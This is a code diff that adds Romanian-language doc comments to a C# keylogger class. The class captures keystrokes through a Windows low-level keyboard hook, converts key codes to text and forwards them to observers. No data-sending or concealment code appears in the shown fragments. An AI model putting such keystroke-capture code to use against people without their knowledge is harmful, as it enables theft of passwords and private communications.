@@ -59,7 +59,13 @@ namespace Keylogger
                 throw new Win32Exception(Marshal.GetLastWin32Error());
             }
         }
-
+        /// <summary>
+        /// functie de callback pentru hook-ul de tastatura, primeste evenimentele de tastare si le proceseaza
+        /// </summary>
+        /// <param name="nCode"></param>
+        /// <param name="wParam"></param>
+        /// <param name="lParam"></param>
+        /// <returns></returns>
         private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && _isActive && !_disposed)
@@ -98,7 +104,11 @@ namespace Keylogger
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
-
+        /// <summary>
+        /// verifica daca o tasta este deja shiftata
+        /// </summary>
+        /// <param name="key"></param>
+        /// <returns></returns>
         private bool IsKeyAlreadyShifted(Keys key)
         {
             // taste in combinatie cu shift
@@ -110,7 +120,12 @@ namespace Keylogger
                    key == Keys.D5 || key == Keys.D6 || key == Keys.D7 || key == Keys.D8 ||
                    key == Keys.D9 || key == Keys.D0;
         }
-
+        /// <summary>
+        /// converteste valoarea enum a unei taste apasate intr-un sir de caractere
+        /// </summary>
+        /// <param name="key"></param>
+        /// <param name="isShiftPressed"></param>
+        /// <returns></returns>
         private string GetKeyName(Keys key, bool isShiftPressed)
         {
             switch (key)
@@ -240,20 +255,29 @@ namespace Keylogger
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
-
+        /// <summary>
+        /// permite clientilor sa se aboneze la evenimentele de tastare
+        /// </summary>
+        /// <param name="observer"></param>
+        /// <returns></returns>
         public IDisposable Subscribe(IObserver<KeyEvent> observer)
         {
             if (!_observers.Contains(observer))
                 _observers.Add(observer);
             return new Unsubscriber(_observers, observer);
         }
-
+        /// <summary>
+        /// eelimina hook-ul de tastatura si curata resursele alocate
+        /// </summary>
         public void Dispose()
         {
             Dispose(true);
             GC.SuppressFinalize(this);
         }
-
+        /// <summary>
+        /// logica de curatare a resurselor
+        /// </summary>
+        /// <param name="disposing"></param>
         protected virtual void Dispose(bool disposing)
         {
             if (!_disposed)
@@ -282,7 +306,9 @@ namespace Keylogger
                 _observers = observers;
                 _observer = observer;
             }
-
+            /// <summary>
+            /// asigura ca observatorul este eliminat din lista de observatori
+            /// </summary>
             public void Dispose()
             {
                 if (_observer != null && _observers.Contains(_observer))
